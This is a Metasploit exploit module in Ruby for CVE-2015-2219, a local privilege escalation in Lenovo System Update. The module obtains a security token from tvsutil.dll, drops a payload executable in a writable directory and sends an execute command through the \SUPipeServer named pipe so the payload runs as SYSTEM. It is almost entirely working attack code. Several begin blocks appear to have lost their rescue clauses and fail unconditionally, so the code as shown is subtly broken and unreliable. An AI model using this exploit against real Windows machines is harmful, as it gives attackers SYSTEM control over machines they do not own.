# This module requires Metasploit: http://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class Metasploit3 < Msf::Exploit::Local
  include Msf::Exploit::EXE
  include Msf::Post::File
  include Msf::Exploit::FileDropper
  include Msf::Post::Windows::Priv
  include Msf::Post::Windows::Services

  Rank = ExcellentRanking

  def initialize(info={})
    super(update_info(info, {
      &#039;Name&#039;            => &#039;Lenovo System Update Privilege Escalation&#039;,
      &#039;Description&#039;     => %q{
        The named pipe, \SUPipeServer, can be accessed by normal users to interact with the
        System update service. The service provides the possibility to execute arbitrary
        commands as SYSTEM if a valid security token is provided. This token can be generated
        by calling the GetSystemInfoData function in the DLL tvsutil.dll. Please, note that the
        System Update is stopped by default but can be started/stopped calling the Executable
        ConfigService.exe.
      },
      &#039;License&#039;         => MSF_LICENSE,
      &#039;Author&#039;          =>
        [
          &#039;Micahel Milvich&#039;, # vulnerability discovery, advisory
          &#039;Sofiane Talmat&#039;,  # vulnerability discovery, advisory
          &#039;h0ng10&#039;           # Metasploit module
        ],
      &#039;Arch&#039;            => ARCH_X86,
      &#039;Platform&#039;        => &#039;win&#039;,
      &#039;DefaultOptions&#039;  =>
        {
          &#039;EXITFUNC&#039;    => &#039;thread&#039;,
        },
      &#039;Targets&#039;         =>
        [
          [ &#039;Windows&#039;, { } ]
        ],
      &#039;Payload&#039;         =>
        {
          &#039;Space&#039;       => 2048,
          &#039;DisableNops&#039; => true
        },
      &#039;References&#039;      =>
        [
          [&#039;OSVDB&#039;, &#039;121522&#039;],
          [&#039;CVE&#039;, &#039;2015-2219&#039;],
          [&#039;URL&#039;, &#039;http://www.ioactive.com/pdfs/Lenovo_System_Update_Multiple_Privilege_Escalations.pdf&#039;]
        ],
      &#039;DisclosureDate&#039; => &#039;Apr 12 2015&#039;,
      &#039;DefaultTarget&#039;  => 0
    }))

    register_options([
      OptString.new(&#039;WritableDir&#039;, [false, &#039;A directory where we can write files (%TEMP% by default)&#039;]),
      OptInt.new(&#039;Sleep&#039;, [true, &#039;Time to sleep while service starts (seconds)&#039;, 4]),
    ], self.class)

  end

  def check
    os = sysinfo[&#039;OS&#039;]

    unless os =~ /windows/i
      return Exploit::CheckCode::Safe
    end

    svc = service_info(&#039;SUService&#039;)
    if svc && svc[:display] =~ /System Update/
      vprint_good("Found service &#039;#{svc[:display]}&#039;")
      return Exploit::CheckCode::Appears
    else
      return Exploit::CheckCode::Safe
    end
  end


  def write_named_pipe(pipe, command)
    invalid_handle_value = 0xFFFFFFFF

    r = session.railgun.kernel32.CreateFileA(pipe, &#039;GENERIC_READ | GENERIC_WRITE&#039;, 0x3, nil, &#039;OPEN_EXISTING&#039;, &#039;FILE_FLAG_WRITE_THROUGH | FILE_ATTRIBUTE_NORMAL&#039;, 0)
    handle = r[&#039;return&#039;]

    if handle == invalid_handle_value
      fail_with(Failure::NoTarget, "#{pipe} named pipe not found")
    else
      vprint_good("Opended #{pipe}! Proceeding...")
    end

    begin

      # First, write the string length as Int32 value
      w = client.railgun.kernel32.WriteFile(handle, [command.length].pack(&#039;l&#039;), 4, 4, nil)

      if w[&#039;return&#039;] == false
        print_error(&#039;The was an error writing to pipe, check permissions&#039;)
        return false
      end

      # Then we send the real command
      w = client.railgun.kernel32.WriteFile(handle, command, command.length, 4, nil)

      if w[&#039;return&#039;] == false
        print_error(&#039;The was an error writing to pipe, check permissions&#039;)
        return false
      end
    ensure
      session.railgun.kernel32.CloseHandle(handle)
    end
    true
  end


  def get_security_token(lenovo_directory)
    unless client.railgun.get_dll(&#039;tvsutil&#039;)
      client.railgun.add_dll(&#039;tvsutil&#039;, "#{lenovo_directory}\\tvsutil.dll")
      client.railgun.add_function(&#039;tvsutil&#039;, &#039;GetSystemInfoData&#039;, &#039;DWORD&#039;, [[&#039;PWCHAR&#039;, &#039;systeminfo&#039;, &#039;out&#039;]], windows_name = nil, calling_conv = &#039;cdecl&#039;)
    end

    dll_response = client.railgun.tvsutil.GetSystemInfoData(256)

    dll_response[&#039;systeminfo&#039;][0,40]
  end


  def config_service(lenovo_directory, option)
    cmd_exec("#{lenovo_directory}\\ConfigService.exe #{option}")
  end


  def exploit
    if is_system?
      fail_with(Failure::NoTarget, &#039;Session is already elevated&#039;)
    end

    su_directory = service_info(&#039;SUService&#039;)[:path][1..-16]
    print_status(&#039;Starting service via ConfigService.exe&#039;)
    config_service(su_directory, &#039;start&#039;)

    print_status(&#039;Giving the service some time to start...&#039;)
    Rex.sleep(datastore[&#039;Sleep&#039;])

    print_status("Getting security token...")
    token = get_security_token(su_directory)
    vprint_good("Security token is: #{token}")

    if datastore[&#039;WritableDir&#039;].nil? || datastore[&#039;WritableDir&#039;].empty?
      temp_dir = get_env(&#039;TEMP&#039;)
    else
      temp_dir = datastore[&#039;WritableDir&#039;]
    end

    print_status("Using #{temp_dir} to drop the payload")

    begin
      cd(temp_dir)
      fail_with(Failure::BadConfig, "Failed to use the #{temp_dir} directory")
    end

    print_status(&#039;Writing malicious exe to remote filesystem&#039;)
    write_path = pwd
    exe_name = "#{rand_text_alpha(10 + rand(10))}.exe"

    begin
      write_file(exe_name, generate_payload_exe)
      register_file_for_cleanup("#{write_path}\\#{exe_name}")
      fail_with(Failure::Unknown, "Failed to drop payload into #{temp_dir}")
    end

    print_status(&#039;Sending Execute command to update service&#039;)

    begin
      write_res = write_named_pipe("\\\\.\\pipe\\SUPipeServer", "/execute #{exe_name} /arguments /directory #{write_path} /type COMMAND /securitycode #{token}")
      fail_with(Failure::Unknown, &#039;Failed to write to pipe&#039;)
    end

    unless write_res
      fail_with(Failure::Unknown, &#039;Failed to write to pipe&#039;)
    end

    print_status(&#039;Stopping service via ConfigService.exe&#039;)
    config_service(su_directory, &#039;stop&#039;)
  end

end

